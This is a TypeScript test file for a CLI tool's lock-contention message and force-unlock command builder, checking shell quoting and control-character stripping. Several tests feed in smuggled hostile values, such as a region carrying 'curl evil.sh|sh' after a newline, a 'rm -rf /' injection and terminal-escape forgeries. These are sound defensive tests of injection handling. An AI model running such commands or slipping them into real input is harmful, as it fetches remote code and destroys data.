import { describe, expect, it, vi } from 'vite-plus/test';
import {
  buildForceUnlockCommand,
  buildLockContentionMessage,
} from '../../../src/state/lock-contention-message.js';
import type { LockManager } from '../../../src/state/lock-manager.js';

/**
 * A `getLockInfo`-only stand-in. The helper's parameter is
 * `Pick<LockManager, 'getLockInfo'>` precisely so a test does not have to
 * construct a real one; the cast keeps that visible.
 */
function lockManagerReturning(info: unknown, spy = vi.fn()): Pick<LockManager, 'getLockInfo'> {
  return {
    getLockInfo: spy.mockResolvedValue(info),
  } as unknown as Pick<LockManager, 'getLockInfo'>;
}

function lockManagerRejecting(err: unknown): Pick<LockManager, 'getLockInfo'> {
  return {
    getLockInfo: vi.fn().mockRejectedValue(err),
  } as unknown as Pick<LockManager, 'getLockInfo'>;
}

describe('buildForceUnlockCommand (issue #2170)', () => {
  it('always carries --stack-region', () => {
    expect(buildForceUnlockCommand('MyStack', 'us-east-1')).toBe(
      'cdkd force-unlock MyStack --stack-region us-east-1'
    );
  });

  it('propagates every flag that decides WHICH lock force-unlock resolves to', () => {
    // The whole point of the issue: `force-unlock` re-resolves the bucket from
    // the ambient profile, so after `cdkd destroy --profile prod` a hint that
    // carried only --stack-region pointed at a different ACCOUNT.
    expect(
      buildForceUnlockCommand('MyStack', 'eu-west-1', {
        profile: 'prod',
        stateBucket: 'cdkd-state-111122223333',
        statePrefix: 'team-a',
      })
    ).toBe(
      'cdkd force-unlock MyStack --stack-region eu-west-1 --profile prod ' +
        '--state-bucket cdkd-state-111122223333 --state-prefix team-a'
    );
  });

  it('omits a flag that was never set rather than emitting an empty value', () => {
    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1', { profile: undefined });
    expect(cmd).not.toContain('--profile');
    expect(cmd).toBe('cdkd force-unlock MyStack --stack-region us-east-1');
  });

  it('quotes a value that would otherwise truncate when pasted', () => {
    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1', { profile: 'my prod' });
    expect(cmd).toContain(`--profile 'my prod'`);
  });

  it('quotes any tilde — the class deliberately does not carry it', () => {
    // `~` was briefly in the safe class for `Parent~Child` (every nested-stack
    // child name). It came back OUT: that widening was only needed while the
    // command was wrapped in `'...'`, and with the wrapper gone a quoted
    // `'Root~Child'` pastes fine — so the class bought nothing while exposing
    // tilde expansion on a value an S3 key can carry.
    expect(buildForceUnlockCommand('Root~Child', 'us-east-1')).toContain(
      `cdkd force-unlock 'Root~Child'`
    );
    expect(buildForceUnlockCommand('~Child', 'us-east-1')).toContain(
      `cdkd force-unlock '~Child'`
    );
  });

  it('emits NO command when sanitization ALTERED the value', () => {
    // `myΩstack` sanitizes to `my stack` — a DIFFERENT stack. Naming it in a
    // force-unlock command is the wrong-lock-object harm this module exists to
    // close, so an altered value suppresses exactly as an empty one does.
    expect(buildForceUnlockCommand('my\u03a9stack', 'us-east-1')).toBe('');
    expect(buildForceUnlockCommand('MyStack', 'us-east-1\u200b')).toBe('');
    // An EXACT value is unaffected.
    expect(buildForceUnlockCommand('MyStack', 'us-east-1')).toContain('cdkd force-unlock MyStack');
  });

  it('emits NO command when a value has nothing renderable left', () => {
    // `--stack-region ''` is FALSY to force-unlock, which treats it as
    // "not supplied" and widens the release to EVERY region holding the stack
    // name. Suggesting nothing is the honest answer.
    expect(buildForceUnlockCommand('MyStack', '\u0000\u0001')).toBe('');
    expect(buildForceUnlockCommand('\u0000', 'us-east-1')).toBe('');
  });

  it('strips the control classes a C0-only denylist misses', () => {
    // U+0085 NEL, the C1 range, the line/paragraph separators (this string is
    // PERSISTED and re-rendered by JSON viewers) and the bidi overrides, which
    // visually reorder the command being pasted.
    for (const hostile of ['\u0085', '\u009b', '\u2028', '\u2029', '\u202e', '\u2066']) {
      const cmd = buildForceUnlockCommand(`My${hostile}Stack`, 'us-east-1');
      expect(cmd, `not stripped: U+${hostile.codePointAt(0)!.toString(16)}`).not.toContain(hostile);
    }
  });


  it('escapes an embedded single quote instead of ending the quoted run', () => {
    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1', { statePrefix: `it's` });
    // The POSIX close-escape-reopen form; pasting this yields the literal value.
    expect(cmd).toContain(`--state-prefix 'it'\\''s'`);
  });
});

describe('buildLockContentionMessage (issue #2170)', () => {
  const base = { stackName: 'MyStack', region: 'us-east-1' };

  it('tolerates a non-string owner instead of silently degrading', async () => {
    // `getLockInfo` is `JSON.parse(body) as LockInfo`, so a hand-written
    // lock.json can carry a number here. `value.replace` used to throw INTO the
    // best-effort catch AFTER the "still running" flag had been set, pairing
    // the confident advice with the evidence-free wording.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 12345, expiresAt: Date.now() + 60_000 }),
    });
    expect(msg).toContain('held by 12345');
    expect(msg).toContain('That process is still running');
  });

  it('does NOT certify "still running" for a lock with no usable owner', async () => {
    // `getLockInfo` is an unvalidated `JSON.parse(...) as LockInfo`. An absent
    // or blank owner is not evidence of a live holder, and printing
    // `held by undefined` while asserting "That process is still running" is
    // MORE confident than the pre-sanitize behaviour, which threw into the
    // catch and gave the cautious wording.
    for (const owner of [undefined, '', '   ', '\u0000']) {
      const msg = await buildLockContentionMessage({
        ...base,
        lockManager: lockManagerReturning({ owner, expiresAt: Date.now() + 60_000 }),
      });
      const why = `owner=${JSON.stringify(owner)}`;
      // The CERTIFICATION is withheld...
      expect(msg, why).not.toContain('That process is still running');
      expect(msg, why).not.toContain('held by undefined');
      expect(msg, why).not.toMatch(/held by\s*,/);
      // ...but the EXPIRY is independent evidence the lock file definitely
      // carries, so dropping it too threw away the one usable fact.
      expect(msg, why).toContain('held by an unnamed holder');
      expect(msg, why).toMatch(/expires in ~\d+m/);
    }
  });

  it('names the holder, the operation and the expiry', async () => {
    // The finding this closes: the message asked the user to decide whether
    // another process was live while printing none of the evidence.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({
        owner: 'alice@host:4242',
        operation: 'deploy',
        expiresAt: Date.now() + 12 * 60_000,
      }),
    });
    expect(msg).toContain('held by alice@host:4242');
    expect(msg).toContain('operation: deploy');
    expect(msg).toMatch(/expires in ~1[12]m/);
  });

  it('reads the holder for the region it was asked about', async () => {
    const spy = vi.fn();
    await buildLockContentionMessage({
      stackName: 'MyStack',
      region: 'ap-northeast-1',
      lockManager: lockManagerReturning(null, spy),
    });
    expect(spy).toHaveBeenCalledWith('MyStack', 'ap-northeast-1');
  });

  it('degrades to the evidence-free wording when the lock has vanished', async () => {
    // A lock released between the failed acquire and this read is a race, not
    // an error — the acquire still legitimately failed.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning(null),
    });
    expect(msg).toContain('another cdkd process holds it');
    expect(msg).not.toContain('held by');
  });

  it('degrades rather than replacing the contention with a read error', async () => {
    // Load-bearing: the caller is already on its way to throwing, and an S3
    // failure here would lose the reason it is throwing.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerRejecting(new Error('AccessDenied')),
    });
    expect(msg).toContain('another cdkd process holds it');
    expect(msg).not.toContain('AccessDenied');
  });

  it('omits the operation clause when the lock records none', async () => {
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'bob@host:1', expiresAt: Date.now() + 60_000 }),
    });
    expect(msg).toContain('held by bob@host:1');
    expect(msg).not.toContain('operation:');
  });

  it('reports an already-expired lock as such rather than as a negative duration', async () => {
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'bob@host:1', expiresAt: Date.now() - 60_000 }),
    });
    expect(msg).toContain('already expired');
    expect(msg).not.toContain('-1m');
  });

  it('varies only the noun across subjects, so one grep finds every spelling', async () => {
    // The third finding: the nine sites had drifted to three spellings, so a
    // user grepping CI logs for one of them found two of three.
    const lockManager = lockManagerReturning(null);
    const [stack, nested, child] = await Promise.all([
      buildLockContentionMessage({ ...base, lockManager }),
      buildLockContentionMessage({ ...base, lockManager, subject: 'nested stack' }),
      buildLockContentionMessage({ ...base, lockManager, subject: 'nested-stack child' }),
    ]);
    for (const msg of [stack, nested, child]) {
      expect(msg).toContain('Could not acquire lock for');
    }
    expect(stack).toContain(`lock for stack 'MyStack'`);
    expect(nested).toContain(`lock for nested stack 'MyStack'`);
    expect(child).toContain(`lock for nested-stack child 'MyStack'`);
  });

  it('keeps a caller-supplied held clause and still adds the evidence', async () => {
    // `cdkd export`'s nested children retry first, so "holds it" would be a
    // less accurate statement than "held it through the retry window".
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'carol@host:9', expiresAt: Date.now() + 60_000 }),
      heldClause: 'another cdkd process held it through the retry window',
      subject: 'nested-stack child',
    });
    expect(msg).toContain('held it through the retry window — held by carol@host:9');
  });

  it('reads correctly on BOTH paths — the connector is not un-built by regex', async () => {
    // The previous revision built `advice` with a trailing `, run:` and
    // stripped it by regex on the suppression path, so a reword would have
    // silently produced `..., run: No recovery command can be shown`.
    const withCommand = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning(null),
    });
    expect(withCommand).toMatch(/active, run: cdkd force-unlock /);

    const suppressed = await buildLockContentionMessage({
      lockManager: lockManagerReturning(null),
      stackName: '\u0000',
      region: 'us-east-1',
    });
    expect(suppressed).not.toContain('run:');
    expect(suppressed).toContain('No recovery command can be shown');
    expect(suppressed).toContain('<unrenderable>');
  });

  it('carries a caller-supplied suffix BEFORE the recovery command', async () => {
    // The command is last and unwrapped so it can be pasted; anything the
    // caller appends has to land ahead of it or it would split the command.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning(null),
      suffix: 'No CloudFormation changeset has been submitted; cdkd state is unchanged.',
    });
    expect(msg).toContain('cdkd state is unchanged.');
    expect(msg.indexOf('cdkd state is unchanged.')).toBeLessThan(
      msg.indexOf('cdkd force-unlock')
    );
    expect(msg.endsWith('--stack-region us-east-1')).toBe(true);
  });

  it('carries the fully-qualified recovery command', async () => {
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning(null),
      recovery: { profile: 'prod', stateBucket: 'bkt' },
    });
    // Trailing and UNWRAPPED: wrapping it in quotes was a live defect, because
    // `shellQuote` also quotes and the two compose into an unpastable string.
    expect(
      msg.endsWith('cdkd force-unlock MyStack --stack-region us-east-1 --profile prod --state-bucket bkt')
    ).toBe(true);
  });

  it('stays pastable when a value needs shell quoting', async () => {
    // The composition defect: with the command wrapped in `'...'`, a quoted
    // value produced `run 'cdkd force-unlock 'Root~Child' ...'`. `~` is now in
    // the safe class (every nested-stack child name carries one), and a value
    // that genuinely needs quoting no longer sits inside an outer pair.
    const msg = await buildLockContentionMessage({
      lockManager: lockManagerReturning(null),
      stackName: 'Root~Child',
      region: 'us-east-1',
      subject: 'nested-stack child',
      recovery: { profile: 'my prod' },
    });
    expect(msg).toContain(`cdkd force-unlock 'Root~Child' --stack-region us-east-1`);
    expect(msg).toContain(`--profile 'my prod'`);
    // No stray outer quote wrapping the whole command.
    expect(msg).not.toContain(`run 'cdkd force-unlock`);
  });

  it('quotes the REGION too — it comes from the state.json body', async () => {
    // A principal who can write the state bucket controls `state.region`, and
    // the result is a command cdkd tells the operator to RUN.
    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1\ncurl evil.sh|sh');
    // Sanitized BEFORE quoting: quoting alone would neutralize the injection
    // but leave a multi-line "recovery command" on the terminal.
    expect(cmd.split('\n')).toHaveLength(1);
  });

  it('QUOTES a hostile region that carries no control character', async () => {
    // The sanitize half and the quote half must BOTH be fenced: the newline
    // case above passes under sanitization alone, so dropping `shellQuote`
    // around the region would leave it green. A `;`-bearing value has nothing
    // to sanitize and is neutralized only by the quoting.
    const cmd = buildForceUnlockCommand('MyStack', 'us-east-1; rm -rf /');
    expect(cmd).toContain(`--stack-region 'us-east-1; rm -rf /'`);
  });

  it('sanitizes the PROSE head too, not only the command', async () => {
    // `region` reaches the message twice. Sanitizing only inside
    // `buildForceUnlockCommand` left the head able to render a multi-line
    // message from a `\n`-bearing state.region.
    const msg = await buildLockContentionMessage({
      lockManager: lockManagerReturning(null),
      stackName: 'My\u001b[2KStack',
      region: 'us-east-1\nFORGED',
      recovery: {},
    });
    expect(msg.split('\n')).toHaveLength(1);
    expect(msg).not.toContain('\u001b');
  });

  it('omits --state-prefix when it is the default', async () => {
    // `--state-prefix` carries a commander default, so every site supplies a
    // value; emitting it unconditionally appended noise to every hint.
    const withDefault = buildForceUnlockCommand('S', 'us-east-1', { statePrefix: 'cdkd' });
    expect(withDefault).not.toContain('--state-prefix');
    const withCustom = buildForceUnlockCommand('S', 'us-east-1', { statePrefix: 'team-a' });
    expect(withCustom).toContain('--state-prefix team-a');
  });

  it('strips control characters from the holder fields', async () => {
    // `owner` / `operation` are bucket-writable and reach a TTY and the
    // persisted events store verbatim.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({
        owner: 'alice@host:1\r\u001b[2KFORGED: run rm -rf /',
        operation: 'deploy\nalso-forged',
        expiresAt: Date.now() + 60_000,
      }),
    });
    expect(msg).not.toContain('\r');
    expect(msg).not.toContain('\u001b');
    expect(msg).not.toContain('\n');
  });

  it('reports an unreadable expiry rather than rendering NaN', async () => {
    // A hand-written or truncated lock.json can omit `expiresAt`.
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'bob@host:1' }),
    });
    expect(msg).toContain('expires at an unknown time');
    expect(msg).not.toContain('NaN');
  });

  it('says the holder is STILL RUNNING when it could name one', async () => {
    // `acquireLock` reaps an expired lock, so a nameable holder is live by
    // construction — the old wording invited the force-unlock this refusal
    // exists to prevent.
    const named = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'alice@host:1', expiresAt: Date.now() + 60_000 }),
    });
    expect(named).toContain('That process is still running');
    const anonymous = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning(null),
    });
    expect(anonymous).not.toContain('That process is still running');
  });

  it('reports a sub-minute remainder without rounding it to ~0m', async () => {
    const msg = await buildLockContentionMessage({
      ...base,
      lockManager: lockManagerReturning({ owner: 'bob@host:1', expiresAt: Date.now() + 20_000 }),
    });
    expect(msg).toContain('expires in under a minute');
    expect(msg).not.toContain('~0m');
  });

  it('shell-quotes the STACK NAME and the BUCKET, not only the profile', async () => {
    const cmd = buildForceUnlockCommand('my stack', 'us-east-1', { stateBucket: 'my bucket' });
    expect(cmd).toContain(`cdkd force-unlock 'my stack'`);
    expect(cmd).toContain(`--state-bucket 'my bucket'`);
  });
});
